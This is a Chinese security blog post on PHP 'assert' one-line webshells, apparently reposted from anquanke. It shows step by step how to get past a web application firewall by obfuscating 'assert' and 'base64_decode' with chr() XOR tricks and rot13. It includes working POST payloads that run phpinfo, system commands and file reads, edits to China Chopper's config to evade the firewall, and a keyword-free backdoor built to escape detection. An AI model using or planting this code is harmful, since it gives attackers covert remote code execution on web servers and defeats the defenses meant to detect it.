> 原文链接: https://www.anquanke.com//post/id/85017 


# 【技术分享】assert免杀一句话


                                阅读量   
                                **161030**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p1.ssl.qhimg.com/t01fafb8b9c4695be2a.jpg)](https://p1.ssl.qhimg.com/t01fafb8b9c4695be2a.jpg)**

****

**作者：**[******3xp10it******](http://bobao.360.cn/member/contribute?uid=2795848922)

**预估稿费：400RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至**[**linwei#360.cn******](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**



**0x00 eval和assert的区别**

[http://www.vuln.cn/8395](http://www.vuln.cn/8395)

[http://www.php.net/manual/zh/function.eval.php](http://www.php.net/manual/zh/function.eval.php)

[http://php.net/manual/zh/functions.variable-functions.php](http://php.net/manual/zh/functions.variable-functions.php)

1)assert是函数,eval不是函数,是语言构造器

2)eval($a)中$a只能是字符串,assert($a)中$a可以是php代码,也可以是php代码的字符串,assert($a)的$a如果是字符串形式不能有2个以上的分号,如果有2个以上的分号只执行到第一个,使用assert来执行多条php语句可借助eval来实现

eg.

```
assert(eval("echo 1;echo 2;"));
```

[注意上面这句如果是assert(eval("echo 1;echo 2"));这样写是不会执行echo 1也不会执行echo 2的,因为eval使用的字符串要是有分号的php语句]

eg.

```
assert(eval(base64_decode($_POST[cmd])));
```

菜刀的连接方式为:

```
assert(eval(base64_decode($_POST[z0])));
```

新版菜刀无法连接assert类型的一句话,因为新版菜刀将连接方式改成了:

```
chopperPassValue=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval($xx($yy[z0]));
```

相当于:



```
$xx="base64_decode"
@eval($xx($_POST[z0]))
```

也即新版菜刀这里有两个以上的分号导致无法连接assert类型的一句话

link:[http://joychou.org/index.php/web/caidao-20141213-does-not-support-php-assert-oneword-backdoor-analysis.html](http://joychou.org/index.php/web/caidao-20141213-does-not-support-php-assert-oneword-backdoor-analysis.html)

 2011年前的菜刀支持assert类型的webshell,2014年以后的菜刀不支持assert类型的webshell

3)实例

a)assert(phpinfo());

或

b)assert("phpinfo()");

或

c)assert("phpinfo();");

上面3个都是可以的,因为PHP函数中的参数如果是字符串可以不加双引号,但是:

a)assert(phpinfo();)不可执行,因为assert后面要接一个表达式,phpinfo();不是表达式,是一条php语句,但是换成assert("phpinfo();")就可以执行了,这样"phpinfo();"当作是一个表达式,但是"phpinfo();print_r(666);"[assert的参数为字符串时字符串的引号中有多个分号时]不被当作表达式

b)assert("echo 1")是不可执行的,因为assert不能执行echo,eval("echo 1")是可以的,assert类型的webshell不能用echo来检测,可以用print_r(1),也即assert("print_r(1)")或assert("print_r(1);")都是可以的

c)assert("print_r(1);print_r(2);")或assert("print_r(1);print_r(2)")都只能执行print_r(1),assert只会执行到第一个分号内的语句

<br>

**0x01 一个waf的绕过过程**

1. waf过滤大部分关键字,eg.base64_decode,“,system等

2.尝试用如下方法绕过[uri=mytag_js.php?aid=9527],是个assert类型的webshell,通过echo不能执行,print_r可以执行判断出不是eval类型webshell

3.考虑有可能是新版菜刀不支持assert类型的webshell连接,换成老版本菜刀依然失败,换成下面过waf的菜刀依然失败[http://joychou.org/index.php/web/make-own-chopper-which-can-bypass-dog.html](http://joychou.org/index.php/web/make-own-chopper-which-can-bypass-dog.html)

 4.hackbar中post:[下面假设密码是x]

```
x=eval("echo 1;$one=(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(96)).(chr(19)^chr(118)).(chr(19)^chr(97)).(chr(19)^chr(103));$three=(chr(19)^chr(113)).(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(118)).(64).(chr(19)^chr(76)).(chr(19)^chr(119)).(chr(19)^chr(118)).(chr(19)^chr(112)).(chr(19)^chr(124)).(chr(19)^chr(119)).(chr(19)^chr(118));echo $_POST[nihao];")&amp;nihao=cGhwaW5mbygp
```

其中$one="assert",$three="base64_decode",$nihao="phpinfo()"以base64编码后的结果,结果无法成功执行phpinfo(),将chr去掉变成:

x=eval("echo 1;echo $_POST[nihao];")&amp;nihao=cGhwaW5mbygp,可以执行简单的echo,现在要想办法把$one和$three换成其他形式,其他不是chr组合的形式

5.尝试post换成如下数据[没有chr]:

```
x=eval("echo 1;$one='assert';$three='b'.'as'.'e'.(64).'_decode';@$one(@$three($_POST[nihao]));")
```

依然失败

6.尝试不用base64_decode,用rot13

```
x=eval(' assert(str_rot13("cucvasb()"))   ;')
```

可执行phpinfo()语句,尝试执行system("whoami"),如下:

```
x=eval(' assert(str_rot13("flfgrz("jubnzv")"))   ;')
```

执行失败,有可能是php禁用了命令执行函数或服务器开启了安全模式

7.考虑直接执行读文件php代码



```
x=eval('$filename ="../index.php";
$handle = fopen($filename, "r");
$contents = fread($handle, filesize ($filename));
print_r($contents);
fclose($handle);')
```

结果可以执行成功,只是控制起来不方便,每次要自己写php代码,尝试改chopper,将里面的关键处的base64_decode换掉

8.最新版本的菜刀可配置度较高,但仍然采用base64加密传输,在菜刀目录下有个caidao.conf利用下面两个特性更改&lt;PHP_BASE&gt;标签中的连接方法可过狗:

a)assert类型的webshell正常情况下只能执行一句话[一个分号内的内容],想让assert类型的webshell执行多句PHP代码,可借助eval执行多条命令

b)把base64_decode想办法混淆eg.将caidao.conf中的PHP_BASE改成如下内容:

```
eval('$a=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);@eval($a("%s"));');
```

成功过狗

9.在waf阻拦下无法连接一句话chopper时,每种waf的阻拦规则不一样,可在新版chopper目录下放多个不同的可过waf的配置文件备用,一个caidao.conf不过狗时再用其他caidao.conf,有效配置为"caidao.conf"文件

<br>

**0x02 免杀无特征无关键字一句话**

**1. 用chr(%d)^chr(%d)代替上面的chr**



```
for($i=1;$i&lt;=200;$i++)
`{`echo 'chr(19)^chr('.$i.') is:';
echo chr(19)^chr($i);
echo '&lt;br&gt;';`}`
```

**2. 上面的php代码可得到以chr(19)为基础的关键字的组合形式如下:**<br>

```
chr(19)^chr(114) is:a
chr(19)^chr(96):s
chr(19)^chr(96):s
chr(19)^chr(118) is:e
chr(19)^chr(97) is:r
chr(19)^chr(103) is:t
chr(19)^chr(113):b
chr(19)^chr(114):a
chr(19)^chr(96):s
chr(19)^chr(118) is:e
chr(19)^chr(37) is:6
chr(19)^chr(39) is:4
chr(19)^chr(76) is:_
chr(19)^chr(119) is:d
chr(19)^chr(118) is:e
chr(19)^chr(112) is:c
chr(19)^chr(124) is:o
chr(19)^chr(119) is:d
chr(19)^chr(118) is:e
```

**3. 组合**<br>

```
$a=(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(96)).(chr(19)^chr(118)).(chr(19)^chr(97)).(chr(19)^chr(103)) ;
$b=(chr(19)^chr(113)).(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(118)).(64).(chr(19)^chr(76)).(chr(19)^chr(119)).(chr(19)^chr(118)).(chr(19)^chr(112)).(chr(19)^chr(124)).(chr(19)^chr(119)).(chr(19)^chr(118));
$a($b($_POST[cmd]));
```

**4. 用法**

eg.

在hackbar中post:

```
cmd=ZXZhbCgnZWNobyAxO3BocGluZm8oKTsnKQ==
```

其中ZXZhbCgnZWNobyAxO3BocGluZm8oKTsnKQ==是eval('echo 1;phpinfo();')的base64编码的结果

如果要执行更复杂的功能可通过以下步骤:

a)在菜刀中新加webshell的url和对应密码

b)_charles开sock5代理,eg.127.0.0.1:8889

c)用proxfier设置菜刀[任意版本菜刀都可]的代理为b)中提供的127.0.0.1:8889

d)把想做的动作在菜刀中做出来,在charles中查看对应的base64编码过的代码是什么

e)将d中得到的base64编码过的代码用hackbar或其他工具base64decode,将解码后的php代码替换上面eval('echo 1;phpinfo();')中的echo 1;phpinfo();后再将eval('这里是解码后的代码')这个整体用hackbar或其他工具base64编码下

f)最后将cmd=xxxxxxxxxxxx 在hackbar中post出去,其中xxxxxxxxx是e中编码后的结果

**5. 特点**

a)传输的数据是base64加密过的没有任何关键字的数据

b)服务端一句话没有任何关键字

c)利用方式不是很方便

<br>

**0x03 相关链接**

mytag_js.php样本文件及分析

样本文件:[https://github.com/3xp10it/webshell/tree/master/mytag_js](https://github.com/3xp10it/webshell/tree/master/mytag_js)

 相关分析:[http://www.nxadmin.com/penetration/1168.html](http://www.nxadmin.com/penetration/1168.html)<br>
